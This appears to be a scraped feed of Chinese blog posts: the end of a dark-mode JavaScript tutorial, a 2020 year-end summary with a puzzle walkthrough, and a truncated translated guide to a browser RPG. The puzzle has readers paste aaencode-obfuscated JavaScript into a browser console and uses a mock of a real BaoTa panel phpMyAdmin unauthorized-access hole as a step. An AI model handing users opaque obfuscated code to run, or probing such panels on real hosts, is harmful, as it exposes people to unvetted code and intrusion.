class=\"built_in\">document</span>.getElementById(<span class=\"comment\">/* element id */</span>);</span><br></pre></td></tr></table></figure><p>接下来，用 <code>try {} catch (e) {}</code> 封装一下 localStorage 的操作，以应对 HTML5 Storage 被禁用、localStorage 被写满、localStorage 实现不完整的情况：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> setLS = <span class=\"function\">(<span class=\"params\">k, v</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.setItem(k, v);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> removeLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.removeItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> getLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">localStorage</span>.getItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span> <span class=\"comment\">// 与 localStorage 中没有找到对应 key 的行为一致</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>我们还需要一个函数读取当前 <code>prefers-color-scheme</code> 的方法。由于已经在 CSS 中定义了 <code>--color-mode</code>，所以在 JS 中直接读取就好了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> getModeFromCSSMediaQuery = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = getComputedStyle(rootElement).getPropertyValue(darkModeMediaQueryKey);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (res.length) <span class=\"keyword\">return</span> res.replace(<span class=\"regexp\">/\\\"/g</span>, <span class=\"string\">''</span>).trim();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res === <span class=\"string\">'dark'</span> ? <span class=\"string\">'dark'</span> : <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// 使用 matchMedia API 的写法会优雅的多</span></span><br><span class=\"line\">  <span class=\"comment\">// return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>还记得我们需要自动取消手动模式回到 <code>prefers-color-scheme</code> 么？意味着我们需要一个函数清掉 LS、删掉 <code>&lt;html&gt;</code> 存在的 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> resetRootDarkModeAttributeAndLS = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  rootElement.removeAttribute(rootElementDarkModeAttributeName);</span><br><span class=\"line\">  removeLS(darkModeStorageKey);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>接下来是起主要作用的函数了，负责为 <code>&lt;html&gt;</code> 标签修改 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> validColorModeKeys = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> applyCustomDarkModeSettings = <span class=\"function\">(<span class=\"params\">mode</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 接受从「开关」处传来的模式，或者从 localStorage 读取</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> currentSetting = mode || getLS(darkModeStorageKey);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (currentSetting === getModeFromCSSMediaQuery()) {</span><br><span class=\"line\">    <span class=\"comment\">// 当用户自定义的显示模式和 prefers-color-scheme 相同时重置、恢复到自动模式</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) { <span class=\"comment\">// 相比 Array#indexOf，这种写法 Uglify 后字节数更少</span></span><br><span class=\"line\">    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 首次访问或从未使用过开关、localStorage 中没有存储的值，currentSetting 是 null</span></span><br><span class=\"line\">    <span class=\"comment\">// 或者 localStorage 被篡改，currentSetting 不是合法值</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>当然，「开关」还需要一个函数，这个函数负责获取相反的显示模式，同时还要将新的模式写入 localStorage 存储起来：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> invertDarkModeObj = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"string\">'light'</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"string\">'dark'</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> toggleCustomDarkMode = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">let</span> currentSetting = getLS(darkModeStorageKey);</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) {</span><br><span class=\"line\">    <span class=\"comment\">// 从 localStorage 中读取模式，并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[currentSetting];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (currentSetting === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// localStorage 中没有相关值，或者 localStorage 抛了 Error</span></span><br><span class=\"line\">    <span class=\"comment\">// 从 CSS 中读取当前 prefers-color-scheme 并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 不知道出了什么幺蛾子，比如 localStorage 被篡改成非法值</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>; <span class=\"comment\">// 直接 return;</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"comment\">// 将相反的模式写入 localStorage</span></span><br><span class=\"line\">  setLS(darkModeStorageKey, currentSetting);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> currentSetting;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>相关的函数都定义完了，是时候添加函数执行了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 当页面加载时，将显示模式设置为 localStorage 中自定义的值（如果有的话）</span></span><br><span class=\"line\">applyCustomDarkModeSettings();</span><br><span class=\"line\"></span><br><span class=\"line\">darkModeTogglebuttonElement.addEventListener(<span class=\"string\">'click'</span>, <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 当用户点击「开关」时，获得新的显示模式、写入 localStorage、并在页面上生效</span></span><br><span class=\"line\">  applyCustomDarkModeSettings(toggleCustomDarkMode());</span><br><span class=\"line\">})</span><br></pre></td></tr></table></figure><p>我的博客也使用的这种实现，通过 Navbar 中的按钮体验一下吧！</p>\n","link":"https://blog.yfun.top/posts/175456095/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 5分13秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量…</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板…）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka’s Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 